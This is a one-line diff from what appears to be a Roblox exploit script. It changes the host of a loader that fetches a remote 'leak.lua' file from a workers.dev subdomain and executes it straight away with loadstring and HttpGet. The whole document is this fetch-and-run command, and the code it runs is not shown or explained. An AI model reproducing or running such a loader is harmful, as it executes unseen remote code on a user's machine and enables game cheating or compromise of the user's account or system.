@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://stalkie.0riginalwarrior55.workers.dev/leak.lua"))()
+loadstring(game:HttpGet("https://stalkie.virtuallynad.workers.dev/leak.lua"))()
